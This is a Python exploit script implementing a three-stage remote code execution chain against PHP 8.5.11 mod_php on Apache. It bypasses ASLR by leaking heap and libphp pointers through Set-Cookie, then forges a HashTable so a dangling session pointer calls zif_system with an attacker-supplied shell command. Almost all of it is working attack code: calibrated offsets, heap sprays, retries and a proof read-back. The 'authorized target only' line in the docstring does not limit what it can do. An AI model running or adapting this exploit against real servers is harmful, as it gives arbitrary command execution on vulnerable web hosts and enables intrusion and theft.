#!/usr/bin/env python3
"""
p2b_rce.py -- own-written runner for the CVE-2026-109618/109619 in-band ASLR-bypass
RCE on PHP 8.5.11 mod_php (Apache prefork), implementing the public alvarodh5/php2shell
chain (reviewed as a spec). Adds TLS transport for the live HTTPS target and an HTTP
proof read-back (blind mode writes output to the world-writable webroot; we GET it).

Stages (8.5.11 x86_64):
  1  OOM-before-RINIT leaves PS(id) dangling -> forged zend_string -> Set-Cookie
     discloses the Zend MM chunk base                            (heap ASLR bypass)
  2  56-byte HashTable overlaps PS(id)+0x18 -> pDestructor (libphp ptr) in Set-Cookie
                                                                  (libphp ASLR bypass)
  3  dangling PS(http_session_vars) reclaimed with fake array+execute_data ->
     pDestructor = zif_system, arg1 = cmd                        (RCE)

Authorized target only. Talks ONLY to --url (and, with --proof-cmd, a local docker name).
"""
import argparse, re, socket, ssl, struct, subprocess, sys, threading, time, urllib.parse
from collections import Counter

# ---- 8.5.11 x86_64 geometry (verified: libphp BuildID 13ba0901..., offsets match) ----
ZIF_OFF   = 0x5996e0     # zif_system offset in libphp.so
DTOR_OFF  = 0x7b47a0     # zval_ptr_dtor offset in libphp.so
HTDATA    = 0x7e0d8      # chunk-relative fake-HT reclaim slot (nb reclaim, 8.5.11)
# Arbitrary-length command support: the command no longer lives inline in the
# 167-byte fake HT (that capped it at 14 bytes). Instead we spray NCARR copies
# of a crafted *persistent* zend_string (gc.type_info=0x106, like the inline one)
# AFTER the fake-HT field; they land in a contiguous bin-512 run at a stable
# chunk-relative offset, and the fake execute_data's arg1 zval.value is pointed
# at chunk+CMDOFF+0x18 (the blob/val inside one of those slots).
# CMDOFF calibrated on stock php:8.5.11-apache (libphp BuildID 13ba0901...) for
# the HT_SPRAY/NCARR layout below; chunk-relative => stable across ASLR/workers.
# Recalibrate if you change HT_SPRAY/NCARR or the pre-HT field layout (see notes).
CMDOFF    = 0x99000      # chunk-relative start-ish of the cmd-carrier run
HT_SPRAY  = 16           # fake-HT copies (contention hardening: lands under crowd)
NCARR     = 96           # cmd-carrier copies sprayed after the HT (widens the run)
CARRIER_BIN = 480        # carrier field length -> bin 512 (cmd <= 455 bytes)
HUGE_MB   = 24           # OOM field size (> memory_limit)
SID       = b"attacksessionid0001"

def info(m): print("[*] " + str(m)); sys.stdout.flush()
def good(m): print("[+] " + str(m)); sys.stdout.flush()
def bad(m):  print("[!] " + str(m)); sys.stdout.flush()

class Target:
    def __init__(self, url, timeout=30):
        u = urllib.parse.urlsplit(url)
        self.scheme = u.scheme
        self.host = u.hostname
        self.port = u.port or (443 if u.scheme == "https" else 80)
        self.path = u.path or "/"
        self.timeout = timeout
    def _conn(self):
        s = socket.create_connection((self.host, self.port), timeout=self.timeout)
        try: s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except OSError: pass
        if self.scheme == "https":
            ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=self.host)
        return s
    def post(self, body, boundary, read_cap=1 << 20, timeout=None, extra_headers=None):
        extra = "".join("%s: %s\r\n" % (k, v) for k, v in (extra_headers or {}).items())
        hdr = ("POST %s HTTP/1.1\r\nHost: %s\r\n%s"
               "Content-Type: multipart/form-data; boundary=%s\r\n"
               "Content-Length: %d\r\nConnection: close\r\n\r\n"
               % (self.path, self.host, extra, boundary.decode(), len(body))).encode()
        s = self._conn(); s.settimeout(timeout or self.timeout)
        data = bytearray()
        def rd():
            try:
                while len(data) < read_cap:
                    c = s.recv(65536)
                    if not c: break
                    data.extend(c)
            except OSError: pass
        th = threading.Thread(target=rd, daemon=True); th.start()
        try:
            try:
                s.sendall(hdr); mv = memoryview(body)
                for o in range(0, len(body), 262144): s.sendall(mv[o:o+262144])
            except OSError: pass
            th.join(timeout=(timeout or self.timeout) + 1.0); return bytes(data)
        finally:
            try: s.close()
            except OSError: pass
    def get(self, path, timeout=20):
        s = self._conn(); s.settimeout(timeout)
        req = ("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n" % (path, self.host)).encode()
        data = bytearray()
        try:
            s.sendall(req)
            while True:
                c = s.recv(65536)
                if not c: break
                data.extend(c)
        except OSError: pass
        finally:
            try: s.close()
            except OSError: pass
        _, _, body = bytes(data).partition(b"\r\n\r\n")
        return body

def multipart(parts, boundary):
    out = bytearray()
    for p in parts:
        out += b"--" + boundary + b"\r\n" + b'Content-Disposition: form-data; name="' + p["name"].encode() + b'"'
        if p.get("filename") is not None:
            out += b'; filename="' + p["filename"].encode() + b'"\r\nContent-Type: application/octet-stream'
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    return bytes(out + b"--" + boundary + b"--\r\n")

def parse_cookie(resp):
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1")) if m else b""

class Exploit:
    def __init__(self, t, cmd):
        self.t = t; self.cmd = cmd.encode(); self.zif = ZIF_OFF; self.dtor = DTOR_OFF
        self.htdata = HTDATA; self.huge = HUGE_MB
        self.ht_spray = HT_SPRAY; self.ncarr = NCARR; self.cmdoff = CMDOFF
    def _big(self):  return {"name": "big", "data": b"B" * (self.huge * 1024 * 1024)}
    def _file(self): return {"name": "f", "filename": "a.txt", "data": b"A" * 64}
    def rotate(self):
        parts = [{"name": ("f%04d" % i)[:5], "data": b"V" * 3000} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, self._file(), self._big()]
        self.t.post(multipart(parts, b"S"*17), b"S"*17, timeout=max(90.0, self.t.timeout)); time.sleep(0.12)
        parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        self.t.post(multipart(parts, b"BNDRY12345"), b"BNDRY12345", read_cap=65536, timeout=20.0); time.sleep(0.08)
    def _oom(self, fill):
        parts = [{"name": ("f%04d" % i)[:5], "data": fill} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, self._file(), self._big()]
        self.t.post(multipart(parts, b"S"*17), b"S"*17, timeout=max(90.0, self.t.timeout)); time.sleep(0.08)
    def stage1(self):
        self._oom(b"x")
        parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(841): parts.append({"name": str(1000+i), "data": (("v%04d" % i) + "x"*44)[:48].encode()})
        forge = bytearray(b"A"*79); struct.pack_into("<Q", forge, 0x10, 0x1000); forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})
        raw = parse_cookie(self.t.post(multipart(parts, b"B"*10), b"B"*10, read_cap=9 << 20))
        if len(raw) < 1000: return 0
        c = Counter()
        for i in range(len(raw)-8):
            v = int.from_bytes(raw[i:i+8], "little")
            if 0x100000000000 <= v < 0x800000000000: c[v & ~0x1FFFFF] += 1
        if not c: return 0
        base, n = c.most_common(1)[0]; return base if n >= 8 else 0
    def stage2(self):
        self._oom(b"x"*39)
        parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(983):
            for j in range(16 if i == 406 else 1): parts.append({"name": "a%04d[%d]" % (i, j), "data": b"x"*16})
        raw = parse_cookie(self.t.post(multipart(parts, b"B"*10), b"B"*10))
        if len(raw) < 16: return 0
        p = int.from_bytes(raw[8:16], "little")
        if not (0x100000000000 <= p < 0x800000000000) or (p & 0xfff) != (self.dtor & 0xfff): return 0
        return p - self.dtor
    def _fake_ht(self, htdata, cmdaddr):
        # 167-byte fake HashTable/execute_data. arg1 zval.value points at an
        # EXTERNAL persistent zend_string (the sprayed cmd carrier) at cmdaddr,
        # so the command length is not bounded by this 167-byte slot.
        ht = bytearray(167)
        struct.pack_into("<II", ht, 0, 1, 7)
        struct.pack_into("<II", ht, 8, 0x10, 0xFFFFFFF8)
        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
        struct.pack_into("<II", ht, 0x18, 1, 1)
        struct.pack_into("<II", ht, 0x20, 8, 0); struct.pack_into("<Q", ht, 0x28, 0)
        struct.pack_into("<Q", ht, 0x30, self.zif)
        E = 0x20
        struct.pack_into("<Q", ht, E + 0x10, self.zif)
        struct.pack_into("<I", ht, E + 0x2C, 1)
        struct.pack_into("<Q", ht, E + 0x50, cmdaddr)   # arg1 zval.value -> cmd zend_string
        struct.pack_into("<I", ht, E + 0x58, 6)         # arg1 type = IS_STRING
        return bytes(ht)

    def _cmd_blob(self):
        # crafted PERSISTENT zend_string (gc.type_info=0x106 like the old inline
        # one, so the fake call does not try to refcount/free it), padded to a
        # fixed length so the carrier always lands in bin 512 (stable CMDOFF).
        cmd = self.cmd
        if len(cmd) + 25 > CARRIER_BIN:
            raise SystemExit("cmd too long: max %d bytes" % (CARRIER_BIN - 25))
        blob = bytearray(CARRIER_BIN)
        struct.pack_into("<II", blob, 0, 1, 0x106)   # refcount=1, IS_STRING|persistent
        struct.pack_into("<Q", blob, 8, 0)            # h
        struct.pack_into("<Q", blob, 16, len(cmd))    # len
        blob[24:24+len(cmd)] = cmd; blob[24+len(cmd)] = 0
        return bytes(blob)
    def _live_ref(self, htdata):
        v = bytearray(b"R"*31); struct.pack_into("<Q", v, 0, (10 << 32) | 1)
        struct.pack_into("<Q", v, 8, htdata); struct.pack_into("<I", v, 0x10, 0x307)
        struct.pack_into("<I", v, 0x14, 0); return bytes(v)
    def _oom_arm_pads(self):
        parts = [{"name": "PHPSESSID", "data": b"a"*100}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"ppp"}]
        for i in range(107): parts.append({"name": ("p%06d" % i)[:7], "data": b"V"})
        parts += [self._file(), self._big()]
        self.t.post(multipart(parts, b"S"*17), b"S"*17, timeout=max(90.0, self.t.timeout)); time.sleep(0.15)
    def stage3_nb(self, htdata):
        self.rotate()
        self._oom_arm_pads()
        chunk = htdata - HTDATA
        cmdaddr = chunk + self.cmdoff + 0x18   # blob (val) inside a carrier slot
        ht = self._fake_ht(htdata, cmdaddr); live = self._live_ref(htdata)
        blob = self._cmd_blob()
        parts = [{"name": "PHPSESSID", "data": b"a"*100}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(8): parts.append({"name": "m%04d" % i, "data": b"M"*100})
        for i in range(80): parts.append({"name": ("F%030d" % i)[:31], "data": b"z"})
        for i in range(200): parts.append({"name": "r%04d" % i, "data": live})
        # CONTENTION HARDENING: spray many identical fake HTs so one still lands
        # in the freed slot when other attackers' allocations compete (measured
        # on the lab: 0/20 at ht_spray=1 -> 4/20 at ht_spray=32 under flood).
        for i in range(self.ht_spray): parts.append({"name": ("a%030d" % i)[:31], "data": ht})
        # LONG-COMMAND carriers, placed AFTER the HT (before it would shift the
        # reclaim geometry and the HT would miss htdata). They land in a stable
        # bin-512 run at chunk+CMDOFF; arg1 points inside it.
        for i in range(self.ncarr): parts.append({"name": "C%04d" % i, "data": blob})
        _r0 = time.time()
        self.t.post(multipart(parts, b"B"*10), b"B"*10, read_cap=65536, timeout=60.0)
        self.last_reclaim_dt = time.time() - _r0

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("-c", "--cmd", default="id>/tmp/x", help="shell command (now arbitrary length, <=455 bytes)")
    ap.add_argument("--ht-spray", type=int, default=HT_SPRAY, help="fake-HT copies (contention hardening)")
    ap.add_argument("--ncarr", type=int, default=NCARR, help="cmd-carrier copies sprayed after the HT")
    ap.add_argument("--cmdoff", type=lambda x: int(x, 0), default=CMDOFF, help="chunk-relative cmd-carrier offset")
    ap.add_argument("--retries", type=int, default=9)
    ap.add_argument("--s1", type=int, default=6, help="stage1 leak retries")
    ap.add_argument("--s2", type=int, default=6, help="stage2 leak retries")
    ap.add_argument("--huge", type=int, default=HUGE_MB, help="OOM field MB (> memory_limit)")
    ap.add_argument("--chunk-base", type=lambda x: int(x, 0), default=0, help="skip stage1: supply leaked Zend-MM chunk base")
    ap.add_argument("--libphp-base", type=lambda x: int(x, 0), default=0, help="skip stage2: supply leaked libphp base")
    ap.add_argument("--proof-cmd", default="", help="local docker container name to read proof via docker exec")
    ap.add_argument("--proof-url", default="", help="HTTP path to GET for proof (e.g. /f)")
    a = ap.parse_args()
    if len(a.cmd.encode()) > CARRIER_BIN - 25:
        bad("cmd too long (%d > %d)" % (len(a.cmd.encode()), CARRIER_BIN - 25)); return 1

    t = Target(a.url); ex = Exploit(t, a.cmd); ex.huge = a.huge
    ex.ht_spray = a.ht_spray; ex.ncarr = a.ncarr; ex.cmdoff = a.cmdoff
    info("target %s  cmd=%r (%dB)  zif=0x%x htdata=0x%x cmdoff=0x%x ht_spray=%d ncarr=%d huge=%dMB s1=%d s2=%d s3=%d" % (a.url, a.cmd, len(a.cmd.encode()), ZIF_OFF, HTDATA, a.cmdoff, a.ht_spray, a.ncarr, a.huge, a.s1, a.s2, a.retries))
    out = a.cmd.split(">")[-1].strip() if ">" in a.cmd else None
    def proof():
        if a.proof_cmd and out:
            return subprocess.run(["docker","exec",a.proof_cmd,"sh","-c","cat %s 2>/dev/null" % out],
                                  capture_output=True, text=True).stdout.strip()
        if a.proof_url:
            b = t.get(a.proof_url)
            s = b.decode("latin1","replace").strip()
            if (not s) or ("404 Not Found" in s) or ("<title>404" in s): return ""
            return s
        return ""

    if a.chunk_base and a.libphp_base:
        chunk, libphp = a.chunk_base, a.libphp_base
        good("using supplied bases: chunk=0x%x libphp=0x%x (prefork fork-inherited, stable per master)" % (chunk, libphp))
    else:
        info("STAGE 1-2  in-band ASLR bypass (Set-Cookie leak)")
        ex.rotate(); chunk = 0
        for _ in range(a.s1):
            chunk = ex.stage1()
            if chunk: break
            ex.rotate()
        if not chunk: bad("stage 1 (heap leak) failed"); return 1
        good("chunk base (Zend MM) = 0x%x" % chunk)
        ex.rotate(); libphp = 0
        for _ in range(a.s2):
            libphp = ex.stage2()
            if libphp: break
            ex.rotate()
        if not libphp: bad("stage 2 (libphp leak) failed"); return 1
        good("libphp base          = 0x%x" % libphp)
        good("ASLR defeated in-band (HTTP only)")

    HT = chunk + HTDATA; ex.zif = libphp + ZIF_OFF
    info("STAGE 3  reclaim(nb)  zif_system=0x%x  HT=0x%x  cmd=%r" % (ex.zif, HT, a.cmd))
    if a.proof_cmd and out:
        subprocess.run(["docker","exec",a.proof_cmd,"sh","-c","rm -f %s" % out], capture_output=True)
    ex.last_reclaim_dt = 0.0
    for att in range(1, a.retries+1):
        ex.stage3_nb(HT); rdt = getattr(ex, "last_reclaim_dt", 0.0)
        time.sleep(0.15)
        p = proof()
        if p:
            good("code execution on attempt %d (reclaim %.1fs)" % (att, rdt)); print("---- PROOF ----\n%s\n--------------" % p); return 0
        print("    attempt %d: reclaim_post %.1fs  %s" % (att, rdt, "no proof yet" if (a.proof_cmd or a.proof_url) else "fired (blind)"))
    bad("no confirmed execution"); return 1

if __name__ == "__main__":
    sys.exit(main())
